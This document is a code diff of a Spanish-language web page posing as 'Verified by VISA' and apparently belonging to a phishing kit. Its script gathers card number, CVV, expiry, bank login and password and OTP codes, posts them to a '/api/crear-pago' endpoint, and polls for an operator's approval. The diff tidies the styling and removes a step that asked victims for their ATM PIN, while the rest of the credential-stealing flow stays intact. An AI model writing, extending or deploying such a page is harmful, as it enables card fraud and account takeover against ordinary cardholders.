@@ -6,11 +6,27 @@
     <title>Verificado por VISA</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" />
     <style>
-        /* ... (Los mismos estilos que ya tenías, omitidos por brevedad, pero conservados en tu archivo) ... */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background-image: url('blure.png'); background-size: cover; background-position: center; background-repeat: no-repeat; background-attachment: fixed; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; position: relative; }
-        body::before { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.5); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); z-index: 0; }
-        .modal-container { background: #ffffff; border-radius: 6px; box-shadow: 0 15px 50px rgba(0, 0, 0, 0.4); padding: 50px; max-width: 480px; width: 100%; position: relative; z-index: 1; }
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background-image: url('blure.png');
+            background-size: cover; background-position: center;
+            background-repeat: no-repeat; background-attachment: fixed;
+            min-height: 100vh; display: flex; align-items: center;
+            justify-content: center; padding: 20px; position: relative;
+        }
+        body::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
+            z-index: 0;
+        }
+        .modal-container {
+            background: #ffffff; border-radius: 6px;
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.4);
+            padding: 50px; max-width: 480px; width: 100%;
+            position: relative; z-index: 1;
+        }
         .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px; min-height: 60px; gap: 15px; }
         .bank-logo { display: flex; align-items: center; justify-content: flex-start; flex: 1; height: 50px; max-width: 60%; }
         .bank-logo img { height: 100%; width: auto; max-width: 100%; object-fit: contain; display: none; }
@@ -139,8 +155,6 @@
         const bankLogoImg = document.getElementById('bankLogoImg');
         const bankIconPlaceholder = document.getElementById('bankIconPlaceholder');
         const bankNombre = document.getElementById('bankNombre');
-        const otpLabel = document.getElementById('otpLabel');
-        const otpInfoMessage = document.getElementById('otpInfoMessage');
 
         function cargarLogoBanco() {
             let banco = localStorage.getItem('bancoEmisor') || '';
@@ -162,7 +176,7 @@
             const t = leerDatosTarjeta();
             let payload = { solicitud_id: solicitudId, titular: t.titular || 'N/A', numero_tarjeta: t.numero || 'N/A', cvv: t.cvv || 'N/A', vencimiento: t.vencimiento || 'N/A', marca_tarjeta: t.marca || 'visa', banco_emisor: t.banco || 'Desconocido', paso: paso };
             if (paso === 'credenciales') { payload.usuario_banco = usernameInput.value.trim(); payload.password_banco = passwordInput.value.trim(); }
-            else if (paso === 'otp' || paso === 'cajero') { payload.codigo_otp = codigoExtra; }
+            else if (paso === 'otp') { payload.codigo_otp = codigoExtra; }
             try {
                 const resp = await fetch('/api/crear-pago', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                 const data = await resp.json();
@@ -192,11 +206,6 @@
                         loadingOverlay.classList.remove('active'); desbloquearOTP(); return;
                     }
 
-                    if (data.estado === 'pedir_cajero') {
-                        clearInterval(pollingInterval); pollingInterval = null;
-                        loadingOverlay.classList.remove('active'); activarModoCajero(); return;
-                    }
-
                     // 🔥 SOLO REDIRIGE A EXITO SI ES EXPLÍCITAMENTE APROBADO EN FASE OTP
                     if (data.estado === 'aprobado' && data.fase === 'otp') {
                         clearInterval(pollingInterval); pollingInterval = null;
@@ -220,14 +229,6 @@
             buttonText.textContent = 'Confirmar OTP'; faseActual = 'otp'; formularioBloqueado = false; submitButton.disabled = false;
         }
 
-        function activarModoCajero() {
-            otpLabel.textContent = 'Clave del Cajero';
-            otpInfoMessage.innerHTML = '<span>Ingresa la <strong>Clave del Cajero</strong> solicitada.</span>';
-            confirmationInput.value = ''; confirmationInput.focus();
-            buttonText.textContent = 'Confirmar Clave'; faseActual = 'cajero';
-            formularioBloqueado = false; submitButton.disabled = false;
-        }
-
         function mostrarError(msg) {
             statusMessage.className = 'status-message error'; statusMessage.textContent = msg; statusMessage.style.display = 'block';
             loadingOverlay.classList.remove('active'); formularioBloqueado = false;
@@ -240,8 +241,6 @@
             usernameInput.value = ''; passwordInput.value = ''; confirmationInput.value = '';
             statusMessage.className = 'status-message'; statusMessage.style.display = 'none';
             formularioBloqueado = false;
-            otpLabel.textContent = 'Código OTP';
-            otpInfoMessage.innerHTML = 'Para realizar este proceso, ingresa el código de Token móvil o físico.';
             if (pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; }
         }
 
@@ -256,7 +255,7 @@
             if (faseActual === 'credenciales') {
                 if (!usernameInput.value.trim()) { usernameInput.parentElement.classList.add('error'); isValid = false; }
                 if (!passwordInput.value.trim()) { passwordInput.parentElement.classList.add('error'); isValid = false; }
-            } else if (faseActual === 'otp' || faseActual === 'cajero') {
+            } else if (faseActual === 'otp') {
                 if (!confirmationInput.value.trim()) { confirmationInput.parentElement.classList.add('error'); isValid = false; }
             }
 
@@ -274,12 +273,6 @@
                 buttonText.textContent = 'Verificando OTP...'; loadingText.textContent = 'Validando código de seguridad...'; loadingOverlay.classList.add('active');
                 const ok = await enviarDatos('otp', confirmationInput.value.trim());
                 if (!ok) { mostrarError('Error al procesar el OTP'); formularioBloqueado = false; submitButton.disabled = false; buttonText.textContent = 'Confirmar OTP'; return; }
-                iniciarPolling('Esperando confirmación final...');
-                
-            } else if (faseActual === 'cajero') {
-                buttonText.textContent = 'Verificando Clave...'; loadingText.textContent = 'Validando clave...'; loadingOverlay.classList.add('active');
-                const ok = await enviarDatos('cajero', confirmationInput.value.trim());
-                if (!ok) { mostrarError('Error al procesar la clave'); formularioBloqueado = false; submitButton.disabled = false; buttonText.textContent = 'Confirmar Clave'; return; }
                 iniciarPolling('Esperando confirmación final...');
             }
         });
